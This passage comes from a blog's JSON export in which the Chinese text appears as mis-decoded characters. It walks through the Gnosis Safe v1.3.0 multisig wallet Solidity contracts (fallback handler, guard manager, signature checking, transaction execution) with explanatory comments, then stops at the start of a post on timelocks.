ç±»å‹çš„å€¼ï¼Œä¸”è¯¥å€¼å¿…é¡»æ˜¯ EIP1271_MAGIC_VALUEå³0x20c13b0bã€‚ 123456789101112131415161718192021// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;contract ISignatureValidatorConstants &#123; // bytes4(keccak256(&quot;isValidSignature(bytes,bytes)&quot;) bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;&#125;abstract contract ISignatureValidator is ISignatureValidatorConstants &#123; /** * @dev Should return whether the signature provided is valid for the provided data * @param _data Arbitrary length data signed on the behalf of address(this) * @param _signature Signature byte array associated with _data * * MUST return the bytes4 magic value 0x20c13b0b when function passes. * MUST NOT modify state (using STATICCALL for solc &lt; 0.5, view modifier for solc &gt; 0.5) * MUST allow external calls */ function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);&#125; 8. FallbackManager.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/SelfAuthorized.sol&quot;;/// @title Fallback Manager - A contract that manages fallback calls made to this contract/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract FallbackManager is SelfAuthorized &#123; event ChangedFallbackHandler(address handler); // keccak256(&quot;fallback_manager.handler.address&quot;) bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5; // å†…éƒ¨å‡½æ•°ï¼Œä½¿ç”¨å†…è”æ±‡ç¼–æ–¹å¼ä¿®æ”¹çŠ¶æ€å˜é‡ FALLBACK_HANDLER_STORAGE_SLOT function internalSetFallbackHandler(address handler) internal &#123; bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; sstore(slot, handler) &#125; &#125; /// @dev Allows to add a contract to handle fallback calls. /// Only fallback calls without value and with data will be forwarded. /// This can only be done via a Safe transaction. /// @param handler contract to handle fallbacks calls. // è®¾ç½®æ–°çš„ handelerï¼Œä½†åªèƒ½æ˜¯æœ¬åˆçº¦å¯¹è±¡æ‰èƒ½è°ƒç”¨ function setFallbackHandler(address handler) public authorized &#123; internalSetFallbackHandler(handler); emit ChangedFallbackHandler(handler); &#125; // solhint-disable-next-line payable-fallback,no-complex-fallback /** å›è°ƒå‡½æ•°ï¼Œæ‰§è¡Œdataä¸­çš„å‘½ä»¤ï¼ˆå‡½æ•°ï¼‰ */ fallback() external &#123; bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; let handler := sload(slot) if iszero(handler) &#123; return(0, 0) &#125; calldatacopy(0, 0, calldatasize()) // The msg.sender address is shifted to the left by 12 bytes to remove the padding // Then the address without padding is stored right after the calldata mstore(calldatasize(), shl(96, caller())) // Add 20 bytes for the address appended add the end let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0) returndatacopy(0, 0, returndatasize()) if iszero(success) &#123; revert(0, returndatasize()) &#125; return(0, returndatasize()) &#125; &#125;&#125; è§£è¯»fallback(): å’Œä»£ç†åˆçº¦å¾ˆåƒï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯è°ƒç”¨ handler ä¸­ data æŒ‡å®šçš„å‘½ä»¤ã€‚ ä»£ç†åˆçº¦ç›¸å…³çŸ¥è¯†ï¼Œå¯ç§»æ­¥åˆ° è¿™é‡Œ 9. StorageAccessible.sol12345678910111213141516171819202122232425262728293031```&gt; **è§£è¯»`getStorageAt`:**&gt;&gt; æŒ¨ä¸ªè¯»å–åˆçº¦ä¸­slotçš„å€¼ã€‚&gt;&gt; ä¸¾ä¾‹è¯´æ˜ï¼š&gt;&gt; ```solidity&gt; // SPDX-License-Identifier: MIT&gt; pragma solidity ^0.8.0;&gt; &gt; contract StorageAt &#123;&gt; &gt; address private solt0 = msg.sender; &gt; uint private solt1 = 9;&gt; string private solt2 = unicode&quot;ä¸è‰¯äºº&quot;;&gt; bytes private solt3 = &quot;biyou&quot;;&gt; &gt; function getStorageAt(uint256 offset, uint256 length) public view returns (bytes memory) &#123;&gt; bytes memory result = new bytes(length * 32); // åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º length * 32çš„æ•°ç»„&gt; for (uint256 index = 0; index &lt; length; index++) &#123;&gt; // solhint-disable-next-line no-inline-assembly&gt; assembly &#123;&gt; let word := sload(add(offset, index)) // æ¯æ¬¡ç§»åŠ¨32bytes&gt; mstore(add(add(result, 0x20), mul(index, 0x20)), word)&gt; &#125;&gt; &#125;&gt; return result;&gt; &#125;&gt; &#125; è¿è¡Œç»“æœï¼š è§£è¯»simulateAndRevertï¼š æ‰§è¡Œä¸€ä¸ªå§”æ‰˜è°ƒç”¨æ“ä½œï¼Œä½¿ç”¨ delegatecall æŒ‡ä»¤å°†å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¼ é€’ç»™ç›®æ ‡åˆçº¦ï¼Œå¹¶å°† calldataPayload ä½œä¸ºè°ƒç”¨æ•°æ®ä¼ é€’ç»™ç›®æ ‡åˆçº¦ã€‚ ä½¿ç”¨ mstore æŒ‡ä»¤å°†è°ƒç”¨ç»“æœçš„å¸ƒå°”å€¼ï¼ˆè¡¨ç¤ºè°ƒç”¨æ˜¯å¦æˆåŠŸï¼‰å­˜å‚¨åœ¨å†…å­˜åœ°å€ 0x00 å¤„ã€‚ ä½¿ç”¨ mstore æŒ‡ä»¤å°†è°ƒç”¨ç»“æœçš„å­—èŠ‚æ•°ï¼ˆå³ returndatasize()ï¼‰å­˜å‚¨åœ¨å†…å­˜åœ°å€ 0x20 å¤„ã€‚ ä½¿ç”¨ returndatacopy æŒ‡ä»¤å°†è°ƒç”¨ç»“æœçš„å­—èŠ‚æµï¼ˆå³ returndataï¼‰ä»è¿”å›æ•°æ®ç¼“å†²åŒºå¤åˆ¶åˆ°å†…å­˜åœ°å€ 0x40 å¤„ã€‚ ä½¿ç”¨ revert æŒ‡ä»¤å°†å½“å‰åˆçº¦çš„æ‰§è¡Œå›æ»šï¼Œå¹¶å°†è°ƒç”¨ç»“æœä½œä¸ºå›æ»šæ•°æ®è¿”å›ã€‚å…·ä½“æ¥è¯´ï¼Œå°†å†…å­˜åœ°å€ 0x00 å¤„çš„å¸ƒå°”å€¼ã€å†…å­˜åœ°å€ 0x20 å¤„çš„å­—èŠ‚æ•°å’Œå†…å­˜åœ°å€ 0x40 å¤„çš„å­—èŠ‚æµä½œä¸ºå›æ»šæ•°æ®è¿”å›ã€‚ ï¼ˆè¯¥å‡½æ•°æ˜¯AIè§£è¯»ï¼Œæš‚æ—¶æœ‰ç‚¹æä¸æ‡‚ï¼‰ 10. GuardManager.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;import &quot;../common/SelfAuthorized.sol&quot;;interface Guard &#123; function checkTransaction( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes memory signatures, address msgSender ) external; function checkAfterExecution(bytes32 txHash, bool success) external;&#125;/// @title Fallback Manager - A contract that manages fallback calls made to this contract/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract GuardManager is SelfAuthorized &#123; event ChangedGuard(address guard); // keccak256(&quot;guard_manager.guard.address&quot;) bytes32 internal constant GUARD_STORAGE_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8; /// @dev Set a guard that checks transactions before execution /// @param guard The address of the guard to be used or the 0 address to disable the guard function setGuard(address guard) external authorized &#123; bytes32 slot = GUARD_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; sstore(slot, guard) &#125; emit ChangedGuard(guard); &#125; function getGuard() internal view returns (address guard) &#123; bytes32 slot = GUARD_STORAGE_SLOT; // solhint-disable-next-line no-inline-assembly assembly &#123; guard := sload(slot) &#125; &#125;&#125; è§£è¯»ï¼š è¿™ä¸ªåˆçº¦å¾ˆç®€å•ï¼Œæœ‰ç‚¹å†…è”æ±‡ç¼–çŸ¥è¯†çš„åº”è¯¥å¾ˆå®¹æ˜“ç†è§£ã€‚ setGuardï¼šä½¿ç”¨æ±‡ç¼–è¯­è¨€ä¿®æ”¹çŠ¶æ€å˜é‡ï¼› getGuard: ä½¿ç”¨æ±‡ç¼–è¯­è¨€è¯»å–çŠ¶æ€å˜é‡ã€‚ åˆ°æ­¤ï¼ŒGnosisSafeç»§æ‰¿çš„æ‰€æœ‰çˆ¶åˆçº¦éƒ½è¿‡äº†ä¸€éã€‚ä¸€å¤©ä¹Ÿå·®ä¸å¤šäº†è¿‡å»äº†ï¼Œæ°´å¹³æœ‰é™ï¼Œå‡ºé”™ä¹Ÿæ˜¯éš¾å…çš„ï¼Œæ¬¢è¿å¤§ä½¬ä»¬ç»™æˆ‘çº é”™ã€‚ è§£è¯»GnosisSafeåˆçº¦è¿™æ˜¯ä¸€ä¸ªä»£ç†åˆçº¦ã€‚ 1. æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./base/ModuleManager.sol&quot;;import &quot;./base/OwnerManager.sol&quot;;import &quot;./base/FallbackManager.sol&quot;;import &quot;./base/GuardManager.sol&quot;;import &quot;./common/EtherPaymentFallback.sol&quot;;import &quot;./common/Singleton.sol&quot;;import &quot;./common/SignatureDecoder.sol&quot;;import &quot;./common/SecuredTokenTransfer.sol&quot;;import &quot;./common/StorageAccessible.sol&quot;;import &quot;./interfaces/ISignatureValidator.sol&quot;;import &quot;./external/GnosisSafeMath.sol&quot;;/// @title Gnosis Safe - A multisignature wallet with support for confirmations using signed messages based on ERC191./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafe is EtherPaymentFallback, Singleton, ModuleManager, OwnerManager, SignatureDecoder, SecuredTokenTransfer, ISignatureValidatorConstants, FallbackManager, StorageAccessible, GuardManager&#123; using GnosisSafeMath for uint256; string public constant VERSION = &quot;1.3.0&quot;; // keccak256( // &quot;EIP712Domain(uint256 chainId,address verifyingContract)&quot; // ); // ç­¾åæ˜¯ä½¿ç”¨ EIP712 ç­¾åæ ‡å¿— bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218; // keccak256( // &quot;SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)&quot; // ); bytes32 private constant SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8; event SafeSetup(address indexed initiator, address[] owners, uint256 threshold, address initializer, address fallbackHandler); event ApproveHash(bytes32 indexed approvedHash, address indexed owner); event SignMsg(bytes32 indexed msgHash); event ExecutionFailure(bytes32 txHash, uint256 payment); event ExecutionSuccess(bytes32 txHash, uint256 payment); uint256 public nonce; bytes32 private _deprecatedDomainSeparator; // Mapping to keep track of all message hashes that have been approve by ALL REQUIRED owners mapping(bytes32 =&gt; uint256) public signedMessages; // Mapping to keep track of all hashes (message or transaction) that have been approve by ANY owners mapping(address =&gt; mapping(bytes32 =&gt; uint256)) public approvedHashes; // This constructor ensures that this contract can only be used as a master copy for Proxy contracts // æ­¤æ„é€ å‡½æ•°ç¡®ä¿æ­¤åå®šåªèƒ½ç”¨ä½œä»£ç†åå®šçš„ä¸»å‰¯æœ¬ constructor() &#123; // By setting the threshold it is not possible to call setup anymore, // so we create a Safe with 0 owners and threshold 1. // This is an unusable Safe, perfect for the singleton threshold = 1; // è®¾ç½®é—¨æ§›ä¸º1,æœ¬èº«å°†ä¸èƒ½è°ƒç”¨è‡ªèº«çš„setupå‡½æ•° &#125; /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. /// @param to Contract address for optional delegate call. /// @param data Data payload for optional delegate call. /// @param fallbackHandler Handler for fallback calls to this contract /// @param paymentToken Token that should be used for the payment (0 is ETH) /// @param payment Value that should be paid /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin) function setup( address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver ) external &#123; // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice // å¦‚æœè¯¥åˆçº¦è¢«åˆå§‹åŒ–äº†ï¼Œåˆ™ setupOwners æ— æ³•è°ƒç”¨æˆåŠŸ setupOwners(_owners, _threshold); // å¦‚æœ fallbackHandler ä¸ä¸º0åœ°å€ï¼Œåˆ™ä¿®æ”¹ fallbackHandlerçš„å€¼ if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler); // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules setupModules(to, data); // åˆå§‹åŒ–Moduleï¼Œå¹¶æ‰§è¡Œå§”æ‰˜è°ƒç”¨ if (payment &gt; 0) &#123; // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself) // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment // paymentTokenå¦‚æœæ˜¯ä»£å¸åœ°å€ï¼Œåˆ™è°ƒç”¨transferå‡½æ•°ï¼Œå¦‚æœæ˜¯address(0)ï¼Œåˆ™æ˜¯å‘é€ ETH handlePayment(payment, 0, 1, paymentToken, paymentReceiver); &#125; emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler); &#125; /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction. /// Note: The fees are always transferred, even if the user transaction fails. /// @param to Destination address of Safe transaction. /// @param value Ether value of Safe transaction. /// @param data Data payload of Safe transaction. /// @param operation Operation type of Safe transaction. /// @param safeTxGas Gas that should be used for the Safe transaction. /// @param baseGas Gas costs that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund) /// @param gasPrice Gas price that should be used for the payment calculation. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param signatures Packed signature data (&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;) function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes memory signatures ) public payable virtual returns (bool success) &#123; bytes32 txHash; // Use scope here to limit variable lifetime and prevent `stack too deep` errors &#123; bytes memory txHashData = encodeTransactionData( // å°†äº¤æ˜“ä¿¡æ¯æ‰“åŒ…å¥½ // Transaction info to, value, data, operation, safeTxGas, // Payment info baseGas, gasPrice, gasToken, refundReceiver, // Signature info nonce ); // Increase nonce and execute transaction. nonce++; // éšæœºæ•°è‡ªå¢ txHash = keccak256(txHashData); // å†å¯¹äº¤æ˜“ä¿¡æ¯è¿›è¡Œä¸€æ¬¡hash checkSignatures(txHash, txHashData, signatures); &#125; address guard = getGuard(); &#123; if (guard != address(0)) &#123; Guard(guard).checkTransaction( // Transaction info to, value, data, operation, safeTxGas, // Payment info baseGas, gasPrice, gasToken, refundReceiver, // Signature info signatures, msg.sender ); &#125; &#125; // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500) // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150 require(gasleft() &gt;= ((safeTxGas * 64) / 63).max(safeTxGas + 2500) + 500, &quot;GS010&quot;); // Use scope here to limit variable lifetime and prevent `stack too deep` errors &#123; uint256 gasUsed = gasleft(); // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than safeTxGas) // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than safeTxGas success = execute(to, value, data, operation, gasPrice == 0 ? (gasleft() - 2500) : safeTxGas); gasUsed = gasUsed.sub(gasleft()); // If no safeTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn&#x27;t revert require(success || safeTxGas != 0 || gasPrice != 0, &quot;GS013&quot;); // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls uint256 payment = 0; if (gasPrice &gt; 0) &#123; payment = handlePayment(gasUsed, baseGas, gasPrice, gasToken, refundReceiver); &#125; if (success) emit ExecutionSuccess(txHash, payment); else emit ExecutionFailure(txHash, payment); &#125; &#123; if (guard != address(0)) &#123; Guard(guard).checkAfterExecution(txHash, success); &#125; &#125; &#125; function handlePayment( uint256 gasUsed, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver ) private returns (uint256 payment) &#123; // solhint-disable-next-line avoid-tx-origin address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver; if (gasToken == address(0)) &#123; // For ETH we will only adjust the gas price to not be higher than the actual used gas price payment = gasUsed.add(baseGas).mul(gasPrice &lt; tx.gasprice ? gasPrice : tx.gasprice); require(receiver.send(payment), &quot;GS011&quot;); &#125; else &#123; payment = gasUsed.add(baseGas).mul(gasPrice); require(transferToken(gasToken, receiver, payment), &quot;GS012&quot;); &#125; &#125; /** * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise. * @param dataHash Hash of the data (could be either a message hash or transaction hash) * @param data That should be signed (this is passed to an external validator contract) * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash. */ function checkSignatures( bytes32 dataHash, bytes memory data, bytes memory signatures ) public view &#123; // Load threshold to avoid multiple storage loads uint256 _threshold = threshold; // Check that a threshold is set require(_threshold &gt; 0, &quot;GS001&quot;); checkNSignatures(dataHash, data, signatures, _threshold); &#125; /** * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise. * @param dataHash Hash of the data (could be either a message hash or transaction hash) * @param data That should be signed (this is passed to an external validator contract) * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash. * @param requiredSignatures Amount of required valid signatures. */ function checkNSignatures( bytes32 dataHash, bytes memory data, bytes memory signatures, uint256 requiredSignatures ) public view &#123; // Check that the provided signature data is not too short require(signatures.length &gt;= requiredSignatures.mul(65), &quot;GS020&quot;); // There cannot be an owner with address 0. address lastOwner = address(0); address currentOwner; uint8 v; bytes32 r; bytes32 s; uint256 i; for (i = 0; i &lt; requiredSignatures; i++) &#123; (v, r, s) = signatureSplit(signatures, i); if (v == 0) &#123; // If v is 0 then it is a contract signature // When handling contract signatures the address of the contract is encoded into r currentOwner = address(uint160(uint256(r))); // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes // This check is not completely accurate, since it is possible that more signatures than the threshold are send. // Here we only check that the pointer is not pointing inside the part that is being processed require(uint256(s) &gt;= requiredSignatures.mul(65), &quot;GS021&quot;); // Check that signature data pointer (s) is in bounds (points to the length of data -&gt; 32 bytes) require(uint256(s).add(32) &lt;= signatures.length, &quot;GS022&quot;); // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length uint256 contractSignatureLen; // solhint-disable-next-line no-inline-assembly assembly &#123; contractSignatureLen := mload(add(add(signatures, s), 0x20)) &#125; require(uint256(s).add(32).add(contractSignatureLen) &lt;= signatures.length, &quot;GS023&quot;); // Check signature bytes memory contractSignature; // solhint-disable-next-line no-inline-assembly assembly &#123; // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s contractSignature := add(add(signatures, s), 0x20) &#125; require(ISignatureValidator(currentOwner).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, &quot;GS024&quot;); &#125; else if (v == 1) &#123; // If v is 1 then it is an approved hash // When handling approved hashes the address of the approver is encoded into r currentOwner = address(uint160(uint256(r))); // Hashes are automatically approved by the sender of the message or when they have been pre-approved via a separate transaction require(msg.sender == currentOwner || approvedHashes[currentOwner][dataHash] != 0, &quot;GS025&quot;); &#125; else if (v &gt; 30) &#123; // If v &gt; 30 then default va (27,28) has been adjusted for eth_sign flow // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover currentOwner = ecrecover(keccak256(abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, dataHash)), v - 4, r, s); &#125; else &#123; // Default is the ecrecover flow with the provided data hash // Use ecrecover with the messageHash for EOA signatures currentOwner = ecrecover(dataHash, v, r, s); &#125; require(currentOwner &gt; lastOwner &amp;&amp; owners[currentOwner] != address(0) &amp;&amp; currentOwner != SENTINEL_OWNERS, &quot;GS026&quot;); lastOwner = currentOwner; &#125; &#125; /// @dev Allows to estimate a Safe transaction. /// This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data. /// Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction` /// @param to Destination address of Safe transaction. /// @param value Ether value of Safe transaction. /// @param data Data payload of Safe transaction. /// @param operation Operation type of Safe transaction. /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs). /// @notice Deprecated in favor of common/StorageAccessible.sol and will be removed in next version. function requiredTxGas( address to, uint256 value, bytes calldata data, Enum.Operation operation ) external returns (uint256) &#123; uint256 startGas = gasleft(); // We don&#x27;t provide an error message here, as we use it to return the estimate require(execute(to, value, data, operation, gasleft())); uint256 requiredGas = startGas - gasleft(); // Convert response to string and return via error message revert(string(abi.encodePacked(requiredGas))); &#125; /** * @dev Marks a hash as approved. This can be used to validate a hash that is used by a signature. * @param hashToApprove The hash that should be marked as approved for signatures that are verified by this contract. */ function approveHash(bytes32 hashToApprove) external &#123; require(owners[msg.sender] != address(0), &quot;GS030&quot;); approvedHashes[msg.sender][hashToApprove] = 1; emit ApproveHash(hashToApprove, msg.sender); &#125; /// @dev Returns the chain id used by this contract. function getChainId() public view returns (uint256) &#123; uint256 id; // solhint-disable-next-line no-inline-assembly assembly &#123; id := chainid() &#125; return id; &#125; function domainSeparator() public view returns (bytes32) &#123; return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this)); &#125; /// @dev Returns the bytes that are hashed to be signed by owners. /// @param to Destination address. /// @param value Ether value. /// @param data Data payload. /// @param operation Operation type. /// @param safeTxGas Gas that should be used for the safe transaction. /// @param baseGas Gas costs for that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund) /// @param gasPrice Maximum gas price that should be used for this transaction. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param _nonce Transaction nonce. /// @return Transaction hash bytes. function encodeTransactionData( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce ) public view returns (bytes memory) &#123; bytes32 safeTxHash = keccak256( abi.encode( SAFE_TX_TYPEHASH, to, value, keccak256(data), operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce ) ); return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash); &#125; /// @dev Returns hash to be signed by owners. /// @param to Destination address. /// @param value Ether value. /// @param data Data payload. /// @param operation Operation type. /// @param safeTxGas Fas that should be used for the safe transaction. /// @param baseGas Gas costs for data used to trigger the safe transaction. /// @param gasPrice Maximum gas price that should be used for this transaction. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param _nonce Transaction nonce. /// @return Transaction hash. function getTransactionHash( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce ) public view returns (bytes32) &#123; return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce)); &#125;&#125; 2. è§£è¯»å‡½æ•°2.1 constructoræ„é€ å™¨çš„ä½œç”¨æ˜¯ä¿®æ”¹é˜ˆå€¼ï¼Œä½¿æœ¬åˆçº¦å°†ä¸èƒ½è°ƒç”¨è‡ªèº«çš„ setupOwnerså‡½æ•°ï¼Œä»¥åŠ setupå‡½æ•°ã€‚ 2.2 setupè¯¥å‡½æ•°ç”¨äºåˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ownerä»¥åŠmoduleã€‚ 2.3 handlePaymentè¯¥å‡½æ•°ç”¨äºè½¬è´¦æ“ä½œï¼Œå¦‚æœ paymentTokenæ˜¯ 0 åœ°å€ï¼Œåˆ™æ‰§è¡Œè½¬ETHçš„æ“ä½œï¼›åä¹‹ï¼Œåˆ™æ‰§è¡Œ paymentTokençš„transferæ“ä½œã€‚ 2.4 execTransactionæ‰§è¡Œå¤šç­¾äº‹åŠ¡ã€‚å…è®¸æ‰§è¡Œç”±æ‰€éœ€æ•°é‡çš„æ‰€æœ‰è€…ç¡®è®¤çš„å®‰å…¨äº¤æ˜“ï¼Œç„¶åå‘æäº¤äº¤æ˜“çš„å¸æˆ·ä»˜æ¬¾ã€‚ 2.5 encodeTransactionDataè¯¥å‡½æ•°ç”¨äºå¤„ç†äº¤æ˜“æ•°æ®ï¼Œå°†äº¤æ˜“æ‰€éœ€çš„æ•°æ®ï¼Œå…¥ msg.value, gasï¼Œgaslimitç­‰è¿›è¡Œæ‰“åŒ…ï¼Œå†æ±‚hashï¼Œæœ€åè¿”å›ä¸€ä¸ªbytesæ•°ç»„ã€‚abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash) ï¼Œå…¶ä¸­ï¼Œbytes1(0x19) å’Œ bytes1(0x01) åˆ†åˆ«è¡¨ç¤º EIP-191 çš„ç‰ˆæœ¬å·å’Œæ ‡å‡†æ¶ˆæ¯ç±»å‹ï¼ŒdomainSeparator å‡½æ•°è¿”å›ä¸€ä¸ªå­—èŠ‚ä¸²ï¼Œç”¨äºæ ‡è¯†ç‰¹å®šçš„å¤šç­¾é’±åŒ…åˆçº¦ï¼ŒsafeTxHash æ˜¯ä¸€ä¸ª uint256 ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºäº¤æ˜“çš„å“ˆå¸Œå€¼ã€‚ 2.6 checkSignaturesæ£€æŸ¥ç­¾åï¼Œç­¾åç¯‡åˆ°æ—¶å€™å•ç‹¬å»å­¦ä¹ ä¸€ä¸‹ã€‚åæ­£è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥æ£€æŸ¥ç­¾åçš„ã€‚ 2.7 requiredTxGasç”¨äºè®¡ç®—æ¶ˆè€—äº†å¤šå°‘gas 2. 8 approveHashæˆæƒã€‚ å‚è€ƒé“¾æ¥link1 æœ€åï¼Œä½œè€…æ°´å¹³æœ‰é™ï¼Œæœ‰é”™è¯·å¤§ä½¬ä»¬åŠæ—¶æŒ‡å‡ºğŸ˜","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"}],"tags":[{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"}]},{"title":"Timelock","slug":"DEFI/Proxy/Timelock","date":"2023-07-20T04:47:10.000Z","updated":"2023-07-20T04:47:10.000Z","comments":true,"path":"2023/07/20/DEFI/Proxy/Timelock/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/DEFI/Proxy/Timelock/","excerpt":"","text":"1. æ—¶é—´é”æ¦‚å¿µæ—¶é—´é”ï¼ˆTimelockï¼‰æ˜¯é“¶è¡Œé‡‘åº“å’Œå…¶ä»–é«˜å®‰å…¨æ€§å®¹å™¨ä¸­å¸¸è§çš„é”å®šæœºåˆ¶ã€‚å®ƒæ˜¯ä¸€ç§è®¡æ—¶å™¨ï¼Œæ—¨åœ¨é˜²æ­¢ä¿é™©ç®±æˆ–ä¿é™©åº“åœ¨é¢„è®¾æ—¶é—´ä¹‹å‰è¢«æ‰“å¼€ï¼Œå³ä¾¿å¼€é”çš„äººçŸ¥é“æ­£ç¡®å¯†ç ã€‚ åœ¨åŒºå—é“¾ï¼Œæ—¶é—´é”è¢«DeFiå’ŒDAOå¤§é‡é‡‡ç”¨ã€‚å®ƒæ˜¯ä¸€æ®µä»£ç 